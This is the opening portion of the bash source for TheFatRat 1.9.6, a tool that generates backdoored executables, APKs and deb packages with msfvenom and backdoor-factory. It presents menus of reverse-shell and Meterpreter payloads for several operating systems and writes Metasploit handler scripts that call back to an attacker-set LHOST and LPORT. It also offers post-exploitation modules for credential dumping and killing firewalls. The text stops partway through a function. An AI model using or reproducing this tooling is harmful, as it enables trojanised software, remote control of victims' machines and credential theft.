#!/usr/bin/env bash

###########################################################################################
#	  										  #
#											  #
#	  THEFATRAT-1.9.6					  			  #	
#											  #
#	  Welcome and dont disclaimer							  #
#	  TheFatRat Author By Edo -maland- { screetec }					  #
#	  Tested On , Backbox , kali Linux and Kali sana v.2				  #
#	  contact me in screetsec@gmail.com or screetsec@dracos-linux.org		  #
#	  Distro Penetration From Indonesia : https://dracos-linux.org/			  #
#	  										  #
#	  www.github.com/screetsec	   						  #
#											  #
############################################################################################



#WARNA KESUKAAN

cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'

#Accurate method to detect user Distro
lnx="Linux"
lsb_release -i > temp/distro.tmp
lsb_release -c > temp/codename.tmp
rlname=`awk '{print $2}' temp/codename.tmp`
dist=`awk '{print $3}' temp/distro.tmp`
dist1=`awk '{print $4}' temp/distro.tmp`
rm -f temp/codename.tmp >/dev/null
rm -f temp/distro.tmp >/dev/null
if [ "$dist" == "$lnx" ];
then
dist0=$dist1
else
dist0=$dist
fi

#SAMARAN TAMPAN
#Variables
path=`pwd`
Versi=1.9.6
codename=Whistle
OS=`uname` #
distro=$dist0
disrov=$rlname
SERVICE=service;
apkembed='tools/apkembed.rb' # exec script path
pwned='python tools/pw_exec.py'
dave='python tools/trusted_2_6.py'
B='tools/prog.cs'
C='tools/dad.c'
apache='tools/apache.c'
paycom='output/payload.c'
pdfcom='output/pdf.c'
bcom='output/Program.cs'
pdfcom='output/pdf.c'
pstager='tools/power.py'
apachecom='output/apache_com.c'
out='output/ip.txt'
pump='tools/pump.py'
dllcustom='temp/dll_cus.c'
reverse1='temp/reverse1.c'
stag='temp/stag.c'
apkconfig=$path/config/apk.tmp
unzip=unzip
temp=$path/temp
file="config/config.path"
grab="config/grab.conf"
meterp="$path/temp/meterpreter.rc"
outf="app_backdoor.apk"
msploit=$path/logs/msploit.log
lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
lanip6=`ip addr | grep 'state UP' -A4 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
hostn=`host $publicip | awk '{print $5}' | sed 's/.$//'`
list=$path/config/listeners
log=$path/logs/apk-old.log
pwind=$path/logs/pwind.log
defcon=$path/config/conf.def
logfud=$path/logs/fudwin.log
# spinner for Metasploit Generator
spinlong ()
{
    echo -e "\n"
    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ "
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}


# spinner for random seed generator
spinlong2 ()
{
    echo -e "\n"
    bar=" 01100111001001001110111001101010101010110101001010111001010101010101010"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
# Check if configuration file for grab script exists in /config folder
# Case grab config does not exist then create a default config with 60 seconds
if [ ! -f $grab ]
then
echo "------------------------------------------------------------" > $grab
echo "| Timeout configuration for Msfconsole file Grabber Script |" >> $grab
echo "------------------------------------------------------------" >> $grab
echo "60" >> $grab
fi

# Default Local Host & Port file creation function
function confdefault () {
clear
confd=$path/config/conf.def
if [ -f "$confd" ]
then
clear
echo -e $okegreen " "
echo "Fatrat detected that exists a default config file
with the following values :"
echo ""
lh=`sed -n 1p $confd`
lp=`sed -n 2p $confd`
echo "LHOST : $lh "
echo "LPORT : $lp "
echo ""
read -rsp $'Press [ENTER] key go to options menu \n' -n 1 key
echo ""
echo -e $okegreen "Select one of the options bellow"
echo ""
echo -e $orange "+---------------------------------+"
echo -e $orange "|$white [$okegreen 1$white ]$yellow Change current config$orange     |"
echo -e $orange "|$white [$okegreen 2$white ]$yellow Delete configuration file$orange |"
echo -e $orange "|$white [$okegreen 3$white ]$yellow Cancel$orange                    |"
echo -e $orange "+---------------------------------+"
echo ""
echo -ne $okegreen "Option : ";tput sgr0
read con
echo ""
case $con in

1)
confd=$path/config/conf.def
rm -rf $confd
touch $confd
clear
echo ""
echo -e $okegreen "Write Lhost value$yellow (ex: 192.168.1.1 or mydomain.com)"
echo -ne $okegreen "LHOST : ";tput sgr0
read val
if [ -z $val ]
then
confdefault
else
echo $val > $confd
fi
echo ""
echo -e $okegreen "Write Lport value$yellow (Must be a port between 1 & 65535)"
echo -ne "LPORT : ";tput sgr0
read val
if [ -z $val ]
then
confdefault
else
echo $val >> $confd
fi
echo -e $okegreen ""
read -rsp $'Configuration created , restart fatrat , Press [ENTER] key to exit fatrat \n' -n 1 key
clear
exit 0

;;
2)
clear
echo -e $okegreen ""
rm -rf $confd
echo "Default configuration file was deleted , you will now have
to input Lhost & Lport values manually in fatrat options ."
echo ""
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
clear
menu

;;

3)
clear
menu

;;
esac

else
echo -e $okegreen ""
echo "No default configuration file detected "
read -rsp $'Press [ENTER] key to go to options \n' -n 1 key
echo ""
clear
echo -e $okegreen "Select one of the options bellow"
echo ""
echo -e $orange "+---------------------+"
echo -e $orange "|$white [$okegreen 1$white ]$yellow Create config$orange |"
echo -e $orange "|$white [$okegreen 2$white ]$yellow Cancel$orange        |"
echo -e $orange "+---------------------+"
echo ""
echo -ne $okegreen "Option : ";tput sgr0
read con
echo ""
case $con in
1)
confd=$path/config/conf.def
touch $confd
echo ""
echo -e $okegreen "Write Lhost value$yellow (ex: 192.168.1.1 or mydomain.com)"
echo -ne $okegreen "LHOST : ";tput sgr0
read val
if [ -z $val ]
then
confdefault
else
echo $val > $confd
fi
echo ""
echo -e $okegreen "Write Lport value$yellow (Must be a port between 1 & 65535)"
echo -ne "LPORT : ";tput sgr0
read val
if [ -z $val ]
then
confdefault
else
echo $val >> $confd
fi
echo -e $okegreen ""
read -rsp $'Configuration created , restart fatrat , Press [ENTER] key to exit fatrat \n' -n 1 key
clear
exit 0
;;
2)
clear
menu
;;
*)
echo -e $red ""
read -rsp $ "Invalid Option"
confdefault
;;
esac
fi
}
# Verify user input values on manual Lhost , Lport & filename
function invalid ()
{
err=0
echo ""
if [ -z "$yourip" ]; then
echo -e $red ""
echo "[ ! ] You must write an IP or Hostname ."
echo -e $okegreen ""
echo "IP Example : 192.168.1.34
Domain Example : myhost.com"
err=1
fi
echo ""
if [ -z "$yourport" ]; then
echo -e $red ""
echo "[ ! ] You must write a port number between 1 & 65535 ."
err=1
fi
if [ -z "$fira" ]; then
echo -e $red ""
echo "[ ! ] You must write a filename ."
echo -e $okegreen ""
echo "Filename Example : myfile"
err=1
fi
echo -e $okegreen ""
}
#Selection of Executable and verify if exists for backdoor-factory
function selexe() {
echo ""
          echo -e $okegreen "Enter the path to your EXE file .(ex: /root/downloads/myfile.exe)"
          echo ""
          echo -ne $cyan "Path : ";tput sgr0
          read exef
if [ ! -f $exef ]
then
echo ""
echo -e $red "File does not exist , make sure you write the right path of it ."
echo ""
echo -e $okegreen "Press [ENTER] key to try again ."
read cont
selexe
fi
}
#Apk embeded file selection and verify if user path is correct
function selapk() {
echo ""
          echo -e $okegreen "Enter the path to your android app/game .(ex: /root/downloads/myapp.apk)"
          echo ""
          echo -ne $cyan "Path : ";tput sgr0
          read exef
if [ ! -f $exef ]
then
echo ""
echo -e $red "File does not exist , make sure you write the right path of it ."
echo ""
echo -e $okegreen "Press [ENTER] key to try again ."
read cont
selapk
fi
}

#debian embeded file selection and verify if user path is correct
function seldeb() {
echo ""
          echo -e $okegreen "Enter the path to your deb file .(ex: /root/downloads/dirbuster.deb)"
          echo ""
          echo -ne $cyan "Path : ";tput sgr0
          read exef
if [ ! -f $exef ]
then
echo ""
echo -e $red "File does not exist , make sure you write the right path of it ."
echo ""
echo -e $okegreen "Press [ENTER] key to try again ."
read cont
seldeb
fi
}

#Verification of user input for Lhost & Lport Only
function invalid1 ()
{
err=0
echo ""
if [ -z "$yourip" ]; then
echo -e $red ""
echo "[ ! ] You must write an IP or Hostname ."
echo -e $okegreen ""
echo "IP Example : 192.168.1.34
Domain Example : myhost.com"
err=1
fi
echo ""
if [ -z "$yourport" ]; then
echo -e $red ""
echo "[ ! ] You must write a port number between 1 & 65535 ."
err=1
fi
echo -e $okegreen ""
}

# Verify if user ip input is valid
#this function is not active yet because user may input an hostame
valid_ip()
{

if [[ $yourip =~ ^[0-255]+\.[0-255]+\.[0-255]+\.[0-255]+$ ]]; then
  echo ""
  err=1
else
  err=0
fi
}

#for checking if your command is correct
gboor ()
{
echo -e $yellow ""
cat << !
  Generate Backdoor
  +------------++-------------------------++-----------------------+
  | Name       ||  Descript   	          || Your Input
  +------------++-------------------------++-----------------------+
  | LHOST      ||  The Listen Addres      || $yourip
  | LPORT      ||  The Listen Ports       || $yourport
  | OUTPUTNAME ||  The Filename output    || $fira
  | PAYLOAD    ||  Payload To Be Used     || $payload
  +------------++-------------------------++-----------------------+


!
}

#for checking if your command is correct when embed backdoor
gboor2 ()
{
echo -e $ ""
cat << !
  Generate Backdoor
  +------------++-------------------------++-----------------------+
  | Name       ||  Descript   	          || Your Input
  +------------++-------------------------++-----------------------+
  | LHOST      ||  The Listen Addres      || $yourip
  | LPORT      ||  The Listen Ports       || $yourport
  | OUTPUTNAME ||  The Filename output    || $outf
  | PAYLOAD    ||  Payload To Be Used     || $payload
  +------------++-------------------------++-----------------------+


!
}
function bkflst () {
echo -e $okegreen "Do you want to create a listener for this configuration"
echo -e $okegreen "to use in msfconsole in future ?"
echo ""
echo -ne $cyan "Choose y/n : "
read sel
case $sel in
y|Y|Yes|yes|YES)
echo ""
echo -e $green "Write the name for this config . (ex : back-lst)"
echo -ne "Filename : ";tput sgr0
read fname
if [ -z $fname ]
then
svf=$path/config/listeners/back-lst.rc
rm -rf $svf >/dev/null 2>&1
echo ""
echo -e $orange "  +-------------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
echo -e $orange "  +-------------------------------------------+"
echo ""
echo -ne $okegreen "  Choose Payload :";tput sgr0
read pld
if [ $pld == "1" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/shell_bind_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/back-lst.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "2" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/shell/reverse_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/back-lst.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "3" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/back-lst.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "4" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_tcp_dns" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/back-lst.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "5" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_http" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/back-lst.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "6" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_https" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/back-lst.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
else
echo -e $red "Invalid option"
echo ""
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
bkflst
fi
else
svf=$path/config/listeners/$fname.rc
rm -rf $fname >/dev/null 2>&1
echo ""
echo -e $orange "  +-------------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
echo -e $orange "  +-------------------------------------------+"
echo ""
echo -ne $okegreen "  Choose Payload :";tput sgr0
read pld
if [ $pld == "1" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/shell_bind_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/$fname.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "2" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/shell/reverse_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/$fname.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "3" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/$fname.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "4" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_tcp_dns" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/$fname.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "5" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_http" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/$fname.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
elif [ $pld == "6" ]
then
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD windows/meterpreter/reverse_https" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/$fname.rc"
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
else
echo -e $red "Invalid option"
echo ""
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
bkflst
fi
fi
;;
n|no|No|NO)
echo -e $okegreen ""
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
;;
*)
clear
menu
;;
esac
}
# Function to create a listener for apk
function crlst() {
echo -e $okegreen "Do you want to create a listener for this configuration"
echo -e $okegreen "to use in msfconsole in future ?"
echo ""
echo -ne $cyan "Choose y/n : "
read sel
case $sel in
y|Y|Yes|yes|YES)
echo ""
echo -e $green "Write the name for this config . (ex : myratapk)"
echo -ne "Filename : ";tput sgr0
read fname
if [ -z $fname ]
then
svf=$path/config/listeners/myratapk.rc
rm -rf $svf >/dev/null 2>&1
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD $payload" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/myratapk.rc"
else
svf=$path/config/listeners/$fname.rc
rm -rf $svf >/dev/null 2>&1
echo "use exploit/multi/handler" > $svf
echo "set PAYLOAD $payload" >> $svf
echo "set LHOST $yourip" >> $svf
echo "set LPORT $yourport" >> $svf
echo "exploit -j" >> $svf
echo -e $okegreen ""
echo "Configuration file saved to $list/$fname.rc"
fi
echo -e $okegreen ""
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
;;
n|no|No|NO)
echo -e $okegreen ""
read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
echo
clear
menu
;;
*)
clear
menu
;;
esac
}
#Post exploit menu selection
function postexp() {
echo ""
echo -e $orange "  +------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow sysinfo.rc$orange                   |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow fast_migrate.rc$orange              |"
echo -e $orange "  |$white [$okegreen 3$white ]$yellow cred_dump.rc$orange                 |"
echo -e $orange "  |$white [$okegreen 4$white ]$yellow gather.rc$orange                    |"
echo -e $orange "  |$white [$okegreen 5$white ]$yellow auto_migrate+killfirewall.rc$orange |"
echo -e $orange "  +------------------------------------+"
echo ""
echo -ne $okegreen "  Choose Post Exploitation Module : ";tput sgr0
read pemd
case $pemd in
1)
pe="$path/postexploit/sysinfo.rc"
;;
2)
pe="$path/postexploit/fast_migrate.rc"
;;
3)
pe="$path/postexploit/cred_dump.rc"
;;
4)
pe="$path/postexploit/gather.rc"
;;
5)
pe="$path/postexploit/auto_migrate+killfirewall.rc"
;;
*)
postexp
;;
esac
}
# Backdoor-factory menu payload selection
function pldbkf() {
echo ""
echo -e $orange "  +--------------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow cave_miner_inline$orange                    |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow iat_reverse_tcp_inline$orange               |"
echo -e $orange "  |$white [$okegreen 3$white ]$yellow iat_reverse_tcp_inline_threaded$orange      |"
echo -e $orange "  |$white [$okegreen 4$white ]$yellow iat_reverse_tcp_stager_threaded$orange      |"
echo -e $orange "  |$white [$okegreen 5$white ]$yellow iat_user_supplied_shellcode_threaded$orange |"
echo -e $orange "  |$white [$okegreen 6$white ]$yellow meterpreter_reverse_https_threaded$orange   |"
echo -e $orange "  |$white [$okegreen 7$white ]$yellow reverse_shell_tcp_inline$orange             |"
echo -e $orange "  |$white [$okegreen 8$white ]$yellow reverse_tcp_stager_threaded$orange          |"
echo -e $orange "  |$white [$okegreen 9$white ]$yellow user_supplied_shellcode_threaded$orange     |"
echo -e $orange "  +--------------------------------------------+"
echo ""
echo -ne $okegreen "  Choose Payload : ";tput sgr0
read pld
case $pld in
1)
payload="cave_miner_inline"
;;
2)
payload="iat_reverse_tcp_inline"
;;
3)
payload="iat_reverse_tcp_inline_threaded"
;;
4)
payload="iat_reverse_tcp_stager_threaded"
;;
5)
payload="iat_user_supplied_shellcode_threaded"
;;
6)
payload="meterpreter_reverse_https_threaded"
;;
7)
payload="reverse_shell_tcp_inline"
;;
8)
payload="reverse_tcp_stager_threaded"
;;
9)
payload="user_supplied_shellcode_threaded"
;;
*)
echo ""
echo -ne $red "Wrong input , choose between 1 and 9 :"
pldbkf
;;
esac
}
# Linux msfvenom payload selection
function pldlnx () {
echo ""
echo -e $orange "  +-----------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow linux/ppc/shell_reverse_tcp$orange       |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow linux/x86/shell_reverse_tcp$orange       |"
echo -e $orange "  |$white [$okegreen 3$white ]$yellow linux/x86/meterpreter/reverse_tcp$orange |"
echo -e $orange "  |$white [$okegreen 4$white ]$yellow osx/armle/shell_reverse_tcp$orange       |"
echo -e $orange "  |$white [$okegreen 5$white ]$yellow osx/ppc/shell_reverse_tcp$orange         |"
echo -e $orange "  |$white [$okegreen 6$white ]$yellow bsd/x86/shell/reverse_tcp$orange         |"
echo -e $orange "  |$white [$okegreen 7$white ]$yellow solaris/x86/shell_reverse_tcp$orange     |"
echo -e $orange "  +-----------------------------------------+"
echo ""
echo -ne $okegreen "  Choose Payload : ";tput sgr0
read pld
case $pld in
1)
payload="linux/ppc/shell_reverse_tcp"
;;
2)
payload="linux/x86/shell_reverse_tcp"
;;
3)
payload="linux/x86/meterpreter/reverse_tcp"
;;
4)
payload="osx/armle/shell_reverse_tcp"
;;
5)
payload="osx/ppc/shell_reverse_tcp"
;;
6)
payload="bsd/x86/shell/reverse_tcp"
;;
7)
payload="solaris/x86/shell_reverse_tcp"
;;
*)
echo ""
echo -ne $red "Wrong input , choose between 1 and 7 :"
pldlnx
;;
esac
}
# Windows msfvenom payload selection
function pldwin () {
echo ""
echo -e $orange "  +-------------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
echo -e $orange "  +-------------------------------------------+"
echo ""
echo -ne $okegreen "  Choose Payload :";tput sgr0
read pld
case $pld in
1)
payload="windows/shell_bind_tcp"
;;
2)
payload="windows/shell/reverse_tcp"
;;
3)
payload="windows/meterpreter/reverse_tcp"
;;
4)
payload="windows/meterpreter/reverse_tcp_dns"
;;
5)
payload="windows/meterpreter/reverse_http"
;;
6)
payload="windows/meterpreter/reverse_https"
;;
*)
echo ""
echo -e $red "Wrong input , choose between 1 and 6"
pldwin
;;
esac
}
# Android msfvenom payload selection
function pldand () {
echo ""
echo -e $orange "  +-------------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow android/meterpreter/reverse_http$orange    |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow android/meterpreter/reverse_https$orange   |"
echo -e $orange "  |$white [$okegreen 3$white ]$yellow android/meterpreter/reverse_tcp$orange     |"
echo -e $orange "  |$white [$okegreen 4$white ]$yellow android/shell/reverse_http$orange          |"
echo -e $orange "  |$white [$okegreen 5$white ]$yellow android/shell/reverse_https$orange         |"
echo -e $orange "  |$white [$okegreen 6$white ]$yellow android/shell/reverse_tcp$orange           |"
echo -e $orange "  +-------------------------------------------+"
echo ""
echo -ne $okegreen "  Choose Payload : ";tput sgr0
read pld
case $pld in
1)
payload="android/meterpreter/reverse_http"
;;
2)
payload="android/meterpreter/reverse_https"
;;
3)
payload="android/meterpreter/reverse_tcp"
;;
4)
payload="android/shell/reverse_http"
;;
5)
payload="android/shell/reverse_https"
;;
6)
payload="android/shell/reverse_tcp"
;;
*)
echo ""
echo -e $red "Wrong input , choose between 1 and 6"
pldand
;;
esac
}
# Mac msfvenom payload selection
function pldmac() {
echo ""
echo -e $orange "  +--------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow python/meterpreter/reverse_tcp$orange |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow generic/shell_reverse_tcp$orange      |"
echo -e $orange "  +--------------------------------------+"
echo ""
echo -ne $okegreen "  Choose Payload : ";tput sgr0
read pld
case $pld in
1)
payload="python/meterpreter/reverse_tcp"
;;
2)
payload="generic/shell_reverse_tcp"
;;
*)
echo ""
echo -e $red "Wrong input , choose between 1 and 2"
pldmac
;;
esac
}
# Linux multi msfvenom payload selection
function pldmul() {
echo ""
echo -e $orange "  +------------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow python/meterpreter/reverse_tcp$orange     |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow python/meterpreter/reverse_http$orange    |"
echo -e $orange "  |$white [$okegreen 3$white ]$yellow python/meterpreter/reverse_https$orange   |"
echo -e $orange "  |$white [$okegreen 4$white ]$yellow python/meterpreter_reverse_http$orange    |"
echo -e $orange "  |$white [$okegreen 5$white ]$yellow python/meterpreter_reverse_https$orange   |"
echo -e $orange "  |$white [$okegreen 6$white ]$yellow python/shell_reverse_tcp$orange           |"
echo -e $orange "  |$white [$okegreen 7$white ]$yellow python/meterpreter/reverse_tcp_ssl$orange |"
echo -e $orange "  +------------------------------------------+"
echo ""
echo -ne $okegreen "  Choose Payload : ";tput sgr0
read pld
case $pld in
1)
payload="python/meterpreter/reverse_tcp"
;;
2)
payload="python/meterpreter/reverse_http"
;;
3)
payload="python/meterpreter/reverse_https"
;;
4)
payload="python/meterpreter_reverse_http"
;;
5)
payload="python/meterpreter_reverse_https"
;;
6)
payload="python/shell_reverse_tcp"
;;
7)
payload="python/meterpreter/reverse_tcp_ssl"
;;
*)
echo ""
echo -e $red "Wrong input , choose between 1 and 7"
pldmul
;;
esac
}

#Microsploit log file
msploitr ()
{
rm -rf $msploit >/dev/null 2>&1
touch $msploit
echo "**********************************************" > $msploit
echo "*           Microsploit    Log               *" >> $msploit
echo "**********************************************" >> $msploit
echo "             Metepreter Data                  " >> $msploit
echo "----------------------------------------------" >> $msploit
cat $meterp | while read LINE
do
echo $LINE >> $msploit
done
echo "----------------------------------------------" >> $msploit
echo "              Xterm Output                    " >> $msploit
echo "----------------------------------------------" >> $msploit

}

#Checking if user is root
[[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; }
resize -s 33 84 > /dev/null
clear

#check if tools path config file exists before proceeding

if [ -f "$file" ]
then
#config file exists , then load tools paths to specific variables
msfconsole=`sed -n 14p $file`
msfvenom=`sed -n 15p $file`
backdoor=`sed -n 16p $file`
searchsploit=`sed -n 17p $file`
aapt=`sed -n 11p $file`
apktool=`sed -n 12p $file`
keytool=`sed -n 7p $file`
sign=`sed -n 5p $file`
dx=`sed -n 10p $file`
else
#config file does not exist
	echo -e $red"Configuration file does not exists , run setup.sh first for config ."
exit 1
fi

#If default Lhost & Lport configuration file exists then load their values to variables
if [ -f "$defcon" ]
then
yourip=`sed -n 1p $defcon`
yourport=`sed -n 2p $defcon`
fi

#Jangan Nakal CTRL C MULU
#Abort fatrat with Ctrl+C

trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
sleep 1
echo ""
echo -e $red"[*] Stop all service , Wait  ..."
Stop
sleep 1
echo ""
echo -e $yellow"[*] Thank You For Using TheFatRat  =)."
echo ""
echo -e $yellow"[*] Check Dracos Linux LFS, Penetration OS From Indonesia  =P."
exit
}
#If first internet check with ping google hostname fails then run this next function to check what happens
function chknet() {
echo -e $red "[X] Your Internet is not working correctly!"
sleep 0.5
echo -e $cyan "[*] Checking ...."
ping -c 1 8.8.4.4 > /dev/null 2>&1
png="$?"
 if [ $png == "0" ]
then
    echo -e $red "[X] Your linux OS is not able to resolve"
    echo -e $red "hostnames over terminal using ping !!"
    echo ""
    echo -e $yellow "Search on the web : (unable to resolve hostnames ping) to find a solution"
echo ""
echo -e $okegreen "Fatrat will continue , but some of its functions may not work properly."
echo ""
echo -e $okegreen "Press [ENTER] key to continue"
read continue
cont
    sleep 0.5
elif [ $png == "1" ]
then
    echo -e $yellow "You are connected to your local network but not to the web ."
    echo -e $yellow "Check if your router/modem gateway is connected to the web ."
echo ""
echo -e $okegreen "Fatrat will continue , but some of its functions may not work properly."
echo ""
echo -e $okegreen "Press [ENTER] key to continue"
read continue
cont
sleep 0.5
elif [ $png == "2" ]
then
echo -e $red "You are not connected to any network ."
echo ""
echo -e $okegreen "Fatrat will continue , but many of its functions will not work properly."
echo ""
echo -e $okegreen "Press [ENTER] key to continue"
read continue
cont
    sleep 0.5
fi
}

cont() {
# check apache if exists
      which apache2 > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Apache2 Server $distro ]: Installation found!;
else

   echo -e $red [x]::[warning]:this script require apache2 to work ;
   echo ""
   echo -e $red [!]::Run setup.sh to install apache2 ;
   echo ""
   sleep 0.5
   exit 1
fi
sleep 0.5

